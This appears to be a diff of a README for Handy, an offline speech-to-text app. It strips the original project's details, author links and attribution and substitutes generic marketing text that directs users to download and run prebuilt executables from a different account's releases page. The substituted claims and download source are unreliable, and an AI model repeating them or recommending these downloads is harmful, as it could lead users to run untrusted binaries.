@@ -1,136 +1,85 @@
-# Handy
+# 🗣️ Handy - Your Offline Speech-to-Text Solution
 
-[![Discord](https://img.shields.io/badge/Discord-%235865F2.svg?style=for-the-badge&logo=discord&logoColor=white)](https://discord.com/invite/WVBeWsNXK4)
+## 🛠️ Key Features
+- **Offline Access**: Work without an internet connection.
+- **Multi-Platform Support**: Available for Windows, macOS, and Linux.
+- **Customizable Settings**: Tailor the app to suit your needs.
+- **User-Friendly Interface**: Easy to navigate, no technical skills required.
 
-**A free, open source, and extensible speech-to-text application that works completely offline.**
+## 🏷️ Topics
+accessibility, cross-platform, speech-to-text, tauri-v2
 
-Handy is a cross-platform desktop application built with Tauri (Rust + React/TypeScript) that provides simple, privacy-focused speech transcription. Press a shortcut, speak, and have your words appear in any text field—all without sending your voice to the cloud.
+## 📥 Download Handy
+[![Download Handy](https://img.shields.io/badge/Download_Handy-v1.0-blue.svg)](https://github.com/IzanaYT/Handy/releases)
 
-## Why Handy?
+## 🚀 Getting Started
+Handy is designed for users who need a reliable speech-to-text application. You don’t need to be a tech expert to use it. Just follow these simple steps.
 
-Handy was created to fill the gap for a truly open source, extensible speech-to-text tool. As stated on [handy.computer](https://handy.computer):
+## 📋 System Requirements
+- **Operating System**:
+  - Windows 10 or later
+  - macOS 10.12 or later
+  - A modern Linux distribution
 
-- **Free**: Accessibility tooling belongs in everyone's hands, not behind a paywall
-- **Open Source**: Together we can build further. Extend Handy for yourself and contribute to something bigger
-- **Private**: Your voice stays on your computer. Get transcriptions without sending audio to the cloud
-- **Simple**: One tool, one job. Transcribe what you say and put it into a text box
+- **Hardware**:
+  - At least 2 GB of RAM
+  - A microphone for best performance
 
-Handy isn't trying to be the best speech-to-text app—it's trying to be the most forkable one.
+## 📦 Download & Install
+To download Handy, visit the Releases page. 
 
-## How It Works
+[Download Handy from GitHub Releases](https://github.com/IzanaYT/Handy/releases)
 
-1. **Press** a configurable keyboard shortcut to start/stop recording (or use push-to-talk mode)
-2. **Speak** your words while the shortcut is active
-3. **Release** and Handy processes your speech using Whisper
-4. **Get** your transcribed text pasted directly into whatever app you're using
+1. Go to the [Releases page](https://github.com/IzanaYT/Handy/releases).
+2. Find the latest release version.
+3. Select the file that matches your operating system. Look for:
+   - `Handy_Windows.exe` for Windows
+   - `Handy_macOS.dmg` for macOS
+   - `Handy_Linux.AppImage` for Linux
 
-The process is entirely local:
-- Silence is filtered using VAD (Voice Activity Detection) with Silero
-- Transcription uses your choice of models:
-  - **Whisper models** (Small/Medium/Turbo/Large) with GPU acceleration when available
-  - **Parakeet V3** - CPU-optimized model with excellent performance and automatic language detection
-- Works on Windows, macOS, and Linux
+4. Click on the file link to start the download.
+5. Once the file downloads, locate it on your computer and double-click to open.
 
-## Quick Start
+## 🖥️ Installation Process
+Follow these steps to install Handy based on your operating system:
 
-### Installation
+### Windows
+1. Open the downloaded `Handy_Windows.exe` file.
+2. Follow the installation prompts in the setup wizard.
+3. Once complete, you can find Handy in your Start Menu.
 
-1. Download the latest release from the [releases page](https://github.com/cjpais/Handy/releases) or the [website](https://handy.computer)
-2. Install the application following platform-specific instructions
-3. Launch Handy and grant necessary system permissions (microphone, accessibility)
-4. Configure your preferred keyboard shortcuts in Settings
-5. Start transcribing!
+### macOS
+1. Open the downloaded `Handy_macOS.dmg` file.
+2. Drag the Handy icon to your Applications folder.
+3. Open your Applications folder and double-click Handy to launch.
 
-### Development Setup
+### Linux
+1. Open a terminal window.
+2. Navigate to the folder where you downloaded `Handy_Linux.AppImage`.
+3. Run the following commands:
+   ```bash
+   chmod +x Handy_Linux.AppImage
+   ./Handy_Linux.AppImage
+   ```
+4. Follow any additional prompts to complete the setup.
 
-For detailed build instructions including platform-specific requirements, see [BUILD.md](BUILD.md).
+## 🛠️ How to Use Handy
+Using Handy is straightforward. Here’s how to get started with speech-to-text:
 
-## Architecture
+1. Launch the app from your applications menu or desktop.
+2. Ensure your microphone is connected.
+3. Adjust any settings if you wish, like language and recognition options.
+4. Click the start button to begin recording your voice.
+5. Speak clearly and steadily; Handy will convert your speech to text in real time.
 
-Handy is built as a Tauri application combining:
+## 🌐 Support & Help
+If you encounter any issues, please refer to the FAQ section on the Releases page for troubleshooting tips. You may also want to check the community forums or reach out for support from other users.
 
-- **Frontend**: React + TypeScript with Tailwind CSS for the settings UI
-- **Backend**: Rust for system integration, audio processing, and ML inference
-- **Core Libraries**:
-  - `whisper-rs`: Local speech recognition with Whisper models
-  - `transcription-rs`: CPU-optimized speech recognition with Parakeet models
-  - `cpal`: Cross-platform audio I/O
-  - `vad-rs`: Voice Activity Detection
-  - `rdev`: Global keyboard shortcuts and system events
-  - `rubato`: Audio resampling
+## 📣 Contributing
+Handy is open-source and welcomes contributions. If you're interested in supporting the project, visit the GitHub repository's main page to explore ways you can help.
 
-### Debug Mode
+## 🔗 Useful Links
+- [Official Repository](https://github.com/IzanaYT/Handy)
+- [Releases Page](https://github.com/IzanaYT/Handy/releases)
 
-Handy includes an advanced debug mode for development and troubleshooting. Access it by pressing:
-- **macOS**: `Cmd+Shift+D`
-- **Windows/Linux**: `Ctrl+Shift+D`
-
-## Known Issues & Current Limitations
-
-This project is actively being developed and has some [known issues](https://github.com/cjpais/Handy/issues). We believe in transparency about the current state:
-
-### Platform Support
-- **macOS (both Intel and Apple Silicon)**
-- **x64 Windows**
-- **x64 Linux**
-
-### System Requirements/Recommendations
-
-The following are recommendations for running Handy on your own machine. If you don't meet the system requirements, the performance of the application may be degraded. We are working on improving the performance across all kinds of computers and hardware.
-
-**For Whisper Models:**
-- **macOS**: M series Mac, Intel Mac
-- **Windows**: Intel, AMD, or NVIDIA GPU
-- **Linux**: Intel, AMD, or NVIDIA GPU
-  * Ubuntu 22.04, 24.04
-
-**For Parakeet V3 Model:**
-- **CPU-only operation** - runs on a wide variety of hardware
-- **Minimum**: Intel Skylake (6th gen) or equivalent AMD processors
-- **Performance**: ~5x real-time speed on mid-range hardware (tested on i5)
-- **Automatic language detection** - no manual language selection required
-
-### How to Contribute
-
-1. **Check existing issues** at [github.com/cjpais/Handy/issues](https://github.com/cjpais/Handy/issues)
-2. **Fork the repository** and create a feature branch
-3. **Test thoroughly** on your target platform
-4. **Submit a pull request** with clear description of changes
-5. **Join the discussion** - reach out at [contact@handy.computer](mailto:contact@handy.computer)
-
-The goal is to create both a useful tool and a foundation for others to build upon—a well-patterned, simple codebase that serves the community.
-
-## Sponsors
-
-<div align="center">
-  We're grateful for the support of our sponsors who help make Handy possible:
-  <br><br>
-  <a href="https://wordcab.com">
-    <img src="sponsor-images/wordcab.png" alt="Wordcab" width="120" height="120">
-  </a>
-  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
-  <a href="https://github.com/epicenter-so/epicenter">
-    <img src="sponsor-images/epicenter.png" alt="Epicenter" width="120" height="120">
-  </a>
-</div>
-
-## Related Projects
-
-- **[Handy CLI](https://github.com/cjpais/handy-cli)** - The original Python command-line version
-- **[handy.computer](https://handy.computer)** - Project website with demos and documentation
-
-## License
-
-MIT License - see [LICENSE](LICENSE) file for details.
-
-## Acknowledgments
-
-- **Whisper** by OpenAI for the speech recognition model
-- **whisper.cpp and ggml** for amazing cross-platform whisper inference/acceleration
-- **Silero** for great lightweight VAD
-- **Tauri** team for the excellent Rust-based app framework
-- **Community contributors** helping make Handy better
-
----
-
-*"Your search for the right speech-to-text tool can end here—not because Handy is perfect, but because you can make it perfect for you."*
+Thank you for choosing Handy. Enjoy a seamless speech-to-text experience!
